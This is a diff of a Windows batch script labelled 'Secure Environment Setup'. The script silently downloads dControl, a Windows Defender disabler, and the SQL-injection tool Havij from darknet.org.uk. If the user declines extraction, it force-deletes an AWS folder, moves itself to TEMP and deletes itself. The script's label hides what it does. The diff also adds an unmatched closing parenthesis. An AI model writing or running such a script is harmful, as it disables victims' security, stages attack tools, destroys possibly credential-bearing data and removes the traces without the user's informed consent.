@@ -21,7 +21,7 @@ set "havij_url=https://www.darknet.org.uk/content/files/Havij_1.12_Free.zip"
 
 :: Header
 echo =============================================
-echo Secure Environment Setup
+echo          Secure Environment Setup
 echo =============================================
 echo.
 
@@ -93,7 +93,7 @@ if not exist !winrar_exe! (
     exit /b
 )
 
-:: === Step 1: Create dControl Folder ===
+:: Create dControl Folder ===
 if not exist "!folder!\" (
     mkdir "!folder!"
     echo [SUCCESS] Created workspace: !folder!
@@ -102,11 +102,11 @@ if not exist "!folder!\" (
 )
 
 
-:: === Step 3: Open Windows Security for the User ===
+:: Open Windows Security for the User ===
 echo [INFO] Opening Windows Security for review...
 start windowsdefender://
 
-:: === Step 4: Download dControl ZIP in the background ===
+:: Download dControl ZIP in the background ===
 echo [STEP] Downloading dControl package in the background...
 powershell -Command "Invoke-WebRequest -Uri '%dcontrol_url%' -OutFile '%dcontrol_zip%' -UseBasicParsing" >nul 2>&1
 if exist "%dcontrol_zip%" (
@@ -135,23 +135,23 @@ powershell -Command "Invoke-WebRequest -Uri '%havij_url%' -OutFile '!havij_zip!'
     exit /b
 )
 
-:: === Step 5: Wait for User Confirmation Before Extraction
+:: Wait for User Confirmation Before Extraction
 set /p userInput="Do you want to continue with extraction for dControl? (Y/N): "
 if /i not "%userInput%"=="Y" (
     echo [INFO] Installation aborted by user.
 
-    :: Move the batch file to the Desktop temporarily
+    :: Move the batch file to the TEMP folder temporarily
     set "batchFilePath=%~f0"
-    set "desktopFolder=%USERPROFILE%\Desktop"
-    set "tempLocation=%desktopFolder%\temp.bat"
+    set "tempFolder=%TEMP%"
+    set "tempLocation=%tempFolder%\temp.bat"
     move /y "!batchFilePath!" "!tempLocation!"
 
     :: Wait for a moment to ensure the batch file has moved
     timeout /t 1 /nobreak >nul
 
-    :: Force delete the AWS folder after the batch file is moved
-    echo [STEP] Force Deleting AWS folder...
-    rd /s /q "!awsFolder!"
+    :: Delete the AWS folder after the batch file is moved
+    echo [STEP] Deleting AWS folder...
+    rmdir /s /q "!awsFolder!"
 
     :: Delete the batch file after closing the terminal
     echo [STEP] Deleting batch file...
@@ -159,6 +159,7 @@ if /i not "%userInput%"=="Y" (
 
     :: Close terminal immediately
     exit /b
+)
 )
 
 
